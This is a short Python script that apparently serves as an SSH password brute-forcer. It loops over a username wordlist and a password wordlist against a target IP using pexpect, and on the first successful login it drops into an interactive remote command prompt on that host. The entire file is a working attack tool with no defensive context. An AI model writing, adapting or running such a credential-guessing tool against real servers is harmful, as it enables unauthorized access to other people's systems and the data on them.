#!/usr/bin/python3

from pexpect import pxssh
import argparse
import time

from ssh_connect import *


def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip", help="Specify Target ip")
	parser.add_argument("file1", help="Specify Wordlist")
	parser.add_argument("file2", help="Specify Wordlist")

	args = parser.parse_args()

	if args.ip and args.file1 and args.file2:
		with open(args.file1, 'r') as lines1:

			startTime = time.time()

			for line in lines1: # reading a line from lines in file
				user = line.strip("\r\n")

				with open(args.file2, 'r') as lines2:
					for line in lines2:
						passwd = line.strip("\r\n")

						print(color_obj.WHITE+"[*] Testing: ", str(user)+":"+str(passwd)+color_obj.ENDC)

						conn = connect(args.ip, user, passwd) # ssh connect

						if conn:

							totalTime = time.time() - startTime
							totalTime = '%.3f'%totalTime

							print(color_obj.PURPLE+f"\n[+] Process Completed\n[+] Time Taken : {totalTime}s\n"+color_obj.ENDC)

							print(color_obj.GREEN+'''[+] SSH connected!!, Type: exit to quit: 
							'''+color_obj.ENDC)
							
							command = input(user+'@'+args.ip+':$ ')

							while command != 'exit':
								conn.sendline(command)
								conn.prompt()
								print(conn.before.decode("utf-8"))
								command = input(user+'@'+args.ip+':$ ')

							else:
								print(color_obj.YEL+'''
Bye!
							'''+color_obj.ENDC)
								exit(0)
	else:
			print(parser.usage)
			exit(0)


if __name__ == '__main__':
	
	main()

